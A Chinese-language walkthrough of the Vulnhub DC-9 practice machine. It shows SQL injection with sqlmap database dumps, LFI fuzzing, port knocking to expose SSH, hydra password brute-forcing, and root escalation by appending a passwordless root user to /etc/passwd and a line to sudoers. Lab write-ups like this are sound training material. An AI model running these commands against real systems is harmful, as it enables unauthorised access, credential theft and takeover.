---
title: DC-9
tags:
  - Vulnhub
  - DC-9
categories: 
  - 渗透靶机训练
description: SQL injection and knockd.
excerpt: SQL injection and knockd.
typora-root-url: DC-9
abbrlink: 26168
date: 2021-04-03 15:07:03
---

# DC-9

## 基础信息收集

NMAP Result：

![image-20210403150827994](image-20210403150827994.png)

Nikto Result：

![image-20210403150852433](image-20210403150852433.png)

看到只开发了HTTP的80端口，访问。

![image-20210403150927773](image-20210403150927773.png)

Search引起了我的注意：

![image-20210403150954257](image-20210403150954257.png)

果断抓包送Burp测试看看，请求如图：

![image-20210403151046270](image-20210403151046270.png)

加个引号测试一下注入，无果，直接试试**\' or \'1\'=\'1**，爆出了所有用户：

![image-20210403151144644](image-20210403151144644.png)

确定存在sql注入。

## SQL注入

跑sqlmap：

```bash
sqlmap -u http://192.168.145.142/results.php --data "search="
```

![image-20210403151419621](image-20210403151419621.png)

爆数据库：

```bash
sqlmap -u http://192.168.145.142/results.php --data "search=" --dbs
```

![image-20210403151456090](image-20210403151456090.png)

爆users库：

```bash
sqlmap -u http://192.168.145.142/results.php --data "search=" -D users --dump
```



![image-20210403151516944](image-20210403151516944.png)

爆Staff库的表：

```bash
sqlmap -u http://192.168.145.142/results.php --data "search=" -D Staff --tables
```

![image-20210403151712378](image-20210403151712378.png)

爆Users表：

![image-20210403151759281](image-20210403151759281.png)

没crack出密码出来，一会去网站看看。

爆StaffDetails表：

```bash
sqlmap -u http://192.168.145.142/results.php --data "search=" -D Staff -T StaffDetails --dump
```

![image-20210403151858193](image-20210403151858193.png)

没啥有用信息。

## 爆admin密码

![image-20210403151952051](image-20210403151952051.png)

emmm，CMD5要付费，23333，我做个题还要交钱吗，永不为奴！

推荐个网站：https://hashes.com/en/decrypt/hash

拿到密码：

![image-20210403152059401](image-20210403152059401.png)

## LFI

登录网站发现底部：

![image-20210403152149942](image-20210403152149942.png)

象征性测试一下：

![image-20210403152215835](image-20210403152215835.png)

emmm，难不成是相对路径，再测试一波：

![image-20210403152257523](image-20210403152257523.png)

相对路径伪协议好像就无法搞了，FUZZ走一波看看敏感配置文件好了：

```bash
wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.145.142/manage.php?file=../../../../FUZZ -b PHPSESSID=q56ip7f0nf6cnrrtqhg1rpi5k3 --hh 1341
```

![image-20210403152630048](image-20210403152630048.png)

读一下：

![image-20210403152831053](image-20210403152831053.png)

过滤地看一下：

![image-20210403152916006](image-20210403152916006.png)

配置了OpenSSH，但是nmap没有扫描到。

## Knockd

说明被藏起来了，扫一下knockd的配置文件：

![image-20210403153009792](image-20210403153009792.png)

确实是被隐藏起来了，敲门顺序是7469，8475，9842

nmap敲门并扫描看看：

```bash
for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.145.142; done
nmap -p22 192.168.145.142
```

![image-20210403153209783](image-20210403153209783.png)

## SSH

利用之前爆出的账号和密码，hydra爆破：

```bash
hydra -L user -P pwd ssh://192.168.145.142 > ssh_services
```

![image-20210403153315276](image-20210403153315276.png)

挨个登录找找有用信息，最后在用户janitor用户的目录下找到了一些密码：

![image-20210403153416639](image-20210403153416639.png)

利用该密码再爆破一次：

```bash
hydra -L user -P newpwd ssh://192.168.145.142 >> ssh_services
```

![image-20210403153516271](image-20210403153516271.png)

发现一个新用户，提权有望！

> 此前已经判断过开始三个用户的提权可能性

## 提权

登录查看sudo：

![image-20210403153624455](image-20210403153624455.png)

发现这个程序：

![image-20210403153649674](image-20210403153649674.png)

应该是一个Python的脚本，找找在哪儿：

![image-20210403153723887](image-20210403153723887.png)

看一下内容：

![image-20210403153746031](image-20210403153746031.png)

追加内容，害，还是老套路提权。

在**\/etc\/passwd**加一个用户就好了。

```bash
echo "escape::0:0:::/bin/bash" > /tmp/escape
sudo ./test /tmp/escape /etc/passwd
```

![image-20210403154116710](image-20210403154116710.png)

添加成功，正当我想切换到用户escape的时候：

![image-20210403154148034](image-20210403154148034.png)

。。。Google了大半天不知道啥问题，算了直接加Sudoers权限吧。。。

```bash
echo "fredf    ALL=(ALL:ALL) ALL" > /tmp/escape2
sudo ./test /tmp/escape2 /etc/sudoers
```

![image-20210403154732372](image-20210403154732372.png)

> 后续测试中，似乎只有使用useradd添加的用户才能切换，不知道是什么情况